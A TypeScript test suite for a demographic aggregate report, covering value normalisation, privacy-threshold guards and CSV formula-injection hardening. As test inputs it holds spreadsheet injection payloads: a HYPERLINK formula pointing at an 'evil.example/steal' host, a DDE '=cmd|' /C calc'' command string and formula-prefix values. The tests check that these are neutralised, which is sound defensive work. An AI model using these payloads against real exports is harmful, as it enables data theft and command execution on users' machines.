import { ObjectId } from 'mongodb';
import {
  DEMOGRAPHIC_AGGREGATE_CSV_COLUMNS,
  buildDemographicAggregateCsv,
  buildDemographicDefinitionAggregate,
  normalizeAggregateValueKeys,
} from '../demographicAggregates';
import type { IDemographicAggregateReport } from '../demographicAggregates';

/**
 * ORG-035, review round 2.
 *
 * Two jobs, both driven by review findings:
 *
 * - **F1 (CSV formula injection).** A member can supply a free-text `string`
 *   definition value, which becomes a bucket key AND a bucket label, and an
 *   administrator can supply a definition title. All three end up in the
 *   export, so every cell must be neutralised before it reaches a spreadsheet.
 * - **F3 (coverage).** The production value shapes (Mongoose `ObjectId`,
 *   `Date`), the boolean normalisation, the threshold guards and the option
 *   index guards are exercised here so the privacy arithmetic is proven on the
 *   types the database actually stores, not only on tidy strings.
 */

/** A small CSV reader so assertions are about parsed cells, not substrings. */
const parseCsv = (csv: string): string[][] => {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;

  for (let index = 0; index < csv.length; index += 1) {
    const character = csv.charAt(index);

    if (quoted) {
      if (character === '"' && csv.charAt(index + 1) === '"') {
        cell += '"';
        index += 1;
      } else if (character === '"') {
        quoted = false;
      } else {
        cell += character;
      }
      continue;
    }

    if (character === '"') {
      quoted = true;
    } else if (character === ',') {
      row.push(cell);
      cell = '';
    } else if (character === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
    } else if (character !== '\r') {
      cell += character;
    }
  }

  if (cell.length > 0 || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }

  return rows;
};

const columnIndex = (column: string): number => DEMOGRAPHIC_AGGREGATE_CSV_COLUMNS.indexOf(column as any);

const STRING_DEFINITION = {
  key: 'preferredName',
  title: 'Preferred name',
  category: 'personal',
  valueType: 'string',
  multiValued: false,
  sensitive: false,
};

const INJECTION = '=HYPERLINK("http://evil.example/steal","click")';

const reportWith = (definition: any): IDemographicAggregateReport => ({
  organization: 'org-1',
  minimumAggregationGroupSize: 5,
  filter: {
    businessUnit: null,
    team: null,
    region: null,
    effectiveFrom: null,
    effectiveTo: null,
    definitionKeys: [],
    cohortRestricted: false,
  },
  definitions: [definition],
  reportedDefinitions: 1,
  suppressedDefinitions: definition.suppressed === true ? 1 : 0,
});

/** 5 members, all with the same value: one bucket that clears a threshold of 5. */
const fiveMembers = (value: unknown): Array<{ user: ObjectId; value: unknown }> =>
  Array.from({ length: 5 }, () => ({ user: new ObjectId(), value }));

describe('demographic aggregate value shapes (ORG-035)', () => {
  describe('Mongoose/Mixed value shapes', () => {
    it('keys members by the ObjectId hex string, which is the real user type', () => {
      const members = Array.from({ length: 5 }, () => ({ user: new ObjectId(), value: 'male' }));

      const aggregate = buildDemographicDefinitionAggregate(
        { ...STRING_DEFINITION, valueType: 'enum', options: [{ key: 'male', label: 'Male' }] },
        members,
        5,
      );

      // Five distinct ObjectIds must be five distinct members, not one
      // "[object Object]" bucket.
      expect(aggregate.cohortTotal).toBe(5);
      expect(aggregate.buckets).toEqual([{ key: 'male', label: 'Male', count: 5, percentage: 100 }]);
    });

    it('uses the ObjectId hex string as the bucket key for a reference definition', () => {
      const region = new ObjectId();

      const aggregate = buildDemographicDefinitionAggregate(
        { key: 'region', title: 'Region', valueType: 'reference' },
        fiveMembers(region),
        5,
      );

      // `value` is Mixed, so a reference is stored as an ObjectId. The bucket
      // key has to be its hex string or the UI cannot join it to the region.
      expect(aggregate.buckets[0].key).toBe(region.toHexString());
      expect(aggregate.buckets[0].count).toBe(5);
    });

    it('renders a Date value as an ISO bucket key and ignores an invalid Date', () => {
      const effective = new Date('2026-03-01T00:00:00.000Z');

      const aggregate = buildDemographicDefinitionAggregate(
        { key: 'startDate', title: 'Start date', valueType: 'date' },
        [...fiveMembers(effective), ...fiveMembers(new Date('not-a-date'))],
        5,
      );

      expect(aggregate.buckets).toEqual([
        {
          key: '2026-03-01T00:00:00.000Z',
          label: '2026-03-01T00:00:00.000Z',
          count: 5,
          percentage: 100,
        },
      ]);
      // The ten invalid-Date rows contributed nothing at all: they must not
      // create a bucket, and they must not inflate the denominator.
      expect(aggregate.cohortTotal).toBe(5);
      expect(aggregate.suppressedCohorts).toBe(0);
    });

    it('falls back to String() for any other scalar owner id', () => {
      const aggregate = buildDemographicDefinitionAggregate(
        { ...STRING_DEFINITION },
        [
          { user: 1 as any, value: 'a' },
          { user: 2 as any, value: 'a' },
          { user: 3 as any, value: 'a' },
          { user: 4 as any, value: 'a' },
          { user: 5 as any, value: 'a' },
        ],
        5,
      );

      expect(aggregate.cohortTotal).toBe(5);
    });

    it('skips a value that has no owner instead of inventing a member', () => {
      const aggregate = buildDemographicDefinitionAggregate(
        STRING_DEFINITION,
        [
          // Ownerless rows are the trap: attributing them to a placeholder
          // would inflate the denominator and could push a cohort over the
          // threshold, which is exactly the privacy bug to avoid.
          { value: 'a' } as any,
          { user: null, value: 'a' } as any,
          { user: '', value: 'a' } as any,
          ...fiveMembers('a'),
        ],
        5,
      );

      expect(aggregate.cohortTotal).toBe(5);
      expect(aggregate.buckets).toHaveLength(1);
    });
  });

  describe('boolean value types', () => {
    it('normalises true/1 and false/0 into two buckets', () => {
      const aggregate = buildDemographicDefinitionAggregate(
        { key: 'remote', title: 'Remote', valueType: 'boolean' },
        [
          { user: 'm1', value: 'true' },
          { user: 'm2', value: '1' },
          { user: 'm3', value: 'false' },
          { user: 'm4', value: '0' },
          { user: 'm5', value: 'maybe' },
        ],
        1,
      );

      // `true`/`1` and `false`/`0` are the same answer; anything else keeps its
      // raw text rather than being silently dropped.
      expect(aggregate.buckets.map((bucket) => bucket.key)).toEqual(['false', 'true', 'maybe']);
      expect(aggregate.buckets.map((bucket) => bucket.count)).toEqual([2, 2, 1]);
      expect(aggregate.cohortTotal).toBe(5);
    });
  });

  describe('threshold guards', () => {
    const twoSmallBuckets = [
      { user: 'm1', value: 'male' },
      { user: 'm2', value: 'female' },
    ];

    it.each([
      ['null', null],
      ['undefined', undefined],
      ['NaN', Number.NaN],
      ['Infinity', Number.POSITIVE_INFINITY],
      ['zero', 0],
      ['negative', -3],
      ['a fraction below one', 0.5],
    ])('treats %s as a threshold of 1 rather than trusting it', (_label, threshold) => {
      const aggregate = buildDemographicDefinitionAggregate(
        STRING_DEFINITION,
        twoSmallBuckets as any,
        threshold as any,
      );

      // A nonsense threshold must degrade to "report everything" (k=1) rather
      // than throw, hide data, or - worse - behave as 0 and report empty
      // buckets.
      expect(aggregate.suppressed).toBe(false);
      expect(aggregate.buckets).toHaveLength(2);
      expect(aggregate.buckets.every((bucket) => bucket.count === 1)).toBe(true);
    });

    it('floors a fractional threshold instead of rounding it up', () => {
      const flooredUp = buildDemographicDefinitionAggregate(
        STRING_DEFINITION,
        twoSmallBuckets as any,
        2.7,
      );
      const exact = buildDemographicDefinitionAggregate(
        STRING_DEFINITION,
        twoSmallBuckets as any,
        2,
      );

      // Math.floor(2.7) === 2, so a 1-member cohort stays suppressed - the same
      // answer as an explicit threshold of 2.
      expect(flooredUp.suppressed).toBe(true);
      expect(flooredUp).toEqual(exact);
    });
  });

  describe('malformed definitions and options', () => {
    it('handles a definition with no options, title, category or value type', () => {
      const aggregate = buildDemographicDefinitionAggregate(
        { key: 'bare' } as any,
        fiveMembers('anything'),
        5,
      );

      expect(aggregate.suppressed).toBe(false);
      expect(aggregate.title).toBe('bare');
      expect(aggregate.category).toBeNull();
      expect(aggregate.valueType).toBe('string');
      expect(aggregate.buckets[0].key).toBe('anything');
    });

    it('reports a bare definition that is fully suppressed without inventing metadata', () => {
      const aggregate = buildDemographicDefinitionAggregate({ key: 'bare' } as any, [], 5);

      expect(aggregate.suppressed).toBe(true);
      expect(aggregate.title).toBe('bare');
      expect(aggregate.category).toBeNull();
      expect(aggregate.valueType).toBe('string');
      expect(aggregate.sensitive).toBe(false);
      expect(aggregate.multiValued).toBe(false);
    });

    it('ignores unusable options instead of throwing on them', () => {
      const definition = {
        key: 'employmentType',
        title: 'Employment type',
        valueType: 'enum',
        options: [
          null,
          undefined,
          { key: 42, label: 'not a string key' },
          { key: '   ', label: 'blank key' },
          { key: 'keep' },
          { key: 'labelled', label: 'Labelled' },
          { key: 'blank-label', label: '   ' },
        ],
      } as any;

      const aggregate = buildDemographicDefinitionAggregate(
        definition,
        [
          ...fiveMembers('keep'),
          ...Array.from({ length: 5 }, () => ({ user: new ObjectId(), value: 'KEEP' })),
          ...Array.from({ length: 5 }, () => ({ user: new ObjectId(), value: 'labelled' })),
          ...Array.from({ length: 5 }, () => ({ user: new ObjectId(), value: 'blank-label' })),
        ],
        5,
      );

      // The junk entries are skipped; the usable ones still key the buckets and
      // `KEEP` merges into `keep` (5 + 5 members), proving the index was built.
      expect(aggregate.buckets.map((bucket) => bucket.key)).toEqual([
        'keep',
        'blank-label',
        'labelled',
      ]);
      expect(aggregate.buckets.map((bucket) => bucket.label)).toEqual([
        'keep',
        'blank-label',
        'Labelled',
      ]);
      expect(aggregate.buckets[0].count).toBe(10);
    });

    it('treats a non-array options field as no options', () => {
      const aggregate = buildDemographicDefinitionAggregate(
        { key: 'x', title: 'X', valueType: 'enum', options: 'nope' } as any,
        fiveMembers('raw'),
        5,
      );

      expect(aggregate.buckets[0]).toEqual({ key: 'raw', label: 'raw', count: 5, percentage: 100 });
    });

    it('treats a non-array values argument as no values', () => {
      const aggregate = buildDemographicDefinitionAggregate(STRING_DEFINITION, undefined as any, 5);

      expect(aggregate.suppressed).toBe(true);
      expect(aggregate.buckets).toEqual([]);
    });
  });
});

describe('demographic aggregate CSV hardening (ORG-035 F1)', () => {
  const csvFor = (definition: any): string[][] => parseCsv(buildDemographicAggregateCsv(reportWith(definition)));

  it('renders a member-supplied =HYPERLINK() value inert', () => {
    // A member typed this into a free-text definition. It becomes both the
    // bucket key and the bucket label, so it is the primary injection vector.
    const aggregate = buildDemographicDefinitionAggregate(
      STRING_DEFINITION,
      fiveMembers(INJECTION),
      5,
    );

    const rows = csvFor(aggregate);
    const label = rows[1][columnIndex('bucket_label')];
    const key = rows[1][columnIndex('bucket_key')];

    // Neutralised: the leading apostrophe makes Excel/Sheets treat the cell as
    // text. The original value still round-trips after that single quote.
    expect(label.charAt(0)).toBe("'");
    expect(label.indexOf('=')).toBe(1);
    expect(label.slice(1)).toBe(INJECTION);
    expect(key.charAt(0)).toBe("'");

    // Nothing in the export may start a formula, quoted or not.
    const text = buildDemographicAggregateCsv(reportWith(aggregate));
    text
      .split('\n')
      .filter((line) => line.length > 0)
      .forEach((line) => {
        expect(line).not.toMatch(/(^|,)["']?[=+@\t\r]/);
        expect(line).not.toMatch(/,"[=+@-]/);
      });
  });

  it.each([
    ['a tab prefix', '\t=1+1'],
    ['a carriage-return prefix', '\r=1+1'],
  ])('neutralises %s in a definition title', (_label, attack) => {
    // TAB and CR are neutralised in the CSV writer, but a *value* can never
    // carry them this far: `toText` trims a string before it becomes a bucket
    // key, so `\t=1+1` arrives as `=1+1` (and is still neutralised - see the
    // label cases below). The title is the channel that preserves them
    // verbatim, so that is where the raw-prefix rule is proven.
    const rows = csvFor(
      buildDemographicDefinitionAggregate(
        { ...STRING_DEFINITION, title: attack },
        fiveMembers('a'),
        5,
      ),
    );

    expect(rows[1][columnIndex('definition_title')]).toBe(`'${attack}`);
  });

  it.each([
    ['a formula', '=1+1'],
    ['a plus prefix', '+1+1'],
    ['a minus prefix', '-1+1'],
    ['an at prefix', '@SUM(1)'],
    // Trimmed by the aggregation, not by the writer - still inert either way.
    ['a tab then a formula', '\t=1+1'],
    ['a carriage return then a formula', '\r=1+1'],
  ])('neutralises %s in a bucket label', (_label, attack) => {
    const aggregate = buildDemographicDefinitionAggregate(STRING_DEFINITION, fiveMembers(attack), 5);
    const rows = csvFor(aggregate);

    const label = rows[1][columnIndex('bucket_label')];
    // The cell's FIRST character is the guard quote, which is what makes a
    // spreadsheet treat the rest as text. Nothing is lost: the payload is
    // intact from index 1.
    expect(label).toBe(`'${attack.trim()}`);
    expect(label.charAt(0)).toBe("'");
  });

  it('neutralises a definition title that starts with a formula prefix', () => {
    // Titles are administrator-supplied, not member-supplied, but a compromised
    // or simply careless admin account must not be able to weaponise an export
    // that another administrator opens.
    const aggregate = buildDemographicDefinitionAggregate(
      { ...STRING_DEFINITION, title: "=cmd|' /C calc'!A0" },
      fiveMembers('a'),
      5,
    );

    const rows = csvFor(aggregate);
    expect(rows[1][columnIndex('definition_title')]).toBe("'=cmd|' /C calc'!A0");
  });

  it('leaves ordinary cells untouched, including numbers', () => {
    const aggregate = buildDemographicDefinitionAggregate(STRING_DEFINITION, fiveMembers('a'), 5);
    const rows = csvFor(aggregate);

    expect(rows[1][columnIndex('definition_title')]).toBe('Preferred name');
    expect(rows[1][columnIndex('bucket_label')]).toBe('a');
    expect(rows[1][columnIndex('count')]).toBe('5');
    expect(rows[1][columnIndex('percentage')]).toBe('100.00');
    expect(rows[1][columnIndex('minimum_group_size')]).toBe('5');
  });

  it('keeps the guard quote inside the quoted field so the CSV still parses', () => {
    const aggregate = buildDemographicDefinitionAggregate(
      STRING_DEFINITION,
      fiveMembers(INJECTION),
      5,
    );

    const csv = buildDemographicAggregateCsv(reportWith(aggregate));
    const rows = parseCsv(csv);

    // Exactly one header row plus one data row: the embedded quotes did not
    // split the record.
    expect(rows).toHaveLength(2);
    expect(rows[1]).toHaveLength(DEMOGRAPHIC_AGGREGATE_CSV_COLUMNS.length);
    // The raw export contains the escaped form, not a bare leading `=`.
    expect(csv).toContain('"\'=HYPERLINK(""http://evil.example/steal"",""click"")"');
  });

  it('neutralises a value that starts with a quote and then a formula', () => {
    const aggregate = buildDemographicDefinitionAggregate(
      STRING_DEFINITION,
      fiveMembers('"=1+1'),
      5,
    );

    const rows = csvFor(aggregate);
    expect(rows[1][columnIndex('bucket_label')]).toBe('"=1+1');
  });

  it('renders a suppressed definition with an empty suppressedCohorts cell', () => {
    const aggregate = buildDemographicDefinitionAggregate(
      STRING_DEFINITION,
      [{ user: 'm1', value: 'a' }],
      5,
    );

    const rows = csvFor(aggregate);
    expect(rows[1][columnIndex('definition_suppressed')]).toBe('true');
    // Masked in the payload, so it must be blank in the export too - not "0",
    // which would read as "no cohorts were withheld".
    expect(rows[1][columnIndex('suppressed_cohorts')]).toBe('');
  });

  it('tolerates a report with no definitions and a bucket with no percentage', () => {
    expect(buildDemographicAggregateCsv({ ...reportWith({} as any), definitions: undefined as any }))
      .toBe(`${DEMOGRAPHIC_AGGREGATE_CSV_COLUMNS.join(',')}\n`);

    const csv = buildDemographicAggregateCsv(
      reportWith({
        definitionKey: 'k',
        title: 'K',
        category: null,
        valueType: 'string',
        multiValued: false,
        sensitive: false,
        suppressed: false,
        suppressedCohorts: 0,
        cohortTotal: 5,
        percentageDenominator: 5,
        denominatorKind: 'respondents',
        // A hand-built/replayed report may carry no computed percentage.
        buckets: [{ key: 'a', label: 'a', count: 5, percentage: 'n/a' as any }],
      }),
    );

    expect(parseCsv(csv)[1][columnIndex('percentage')]).toBe('');
  });

  it('exports normalizeAggregateValueKeys output unchanged for scalars', () => {
    // Belt and braces: the neutralisation lives in the CSV writer, not in the
    // aggregation, so the JSON report still carries the member's real value.
    expect(normalizeAggregateValueKeys(INJECTION)).toEqual([INJECTION]);
  });
});
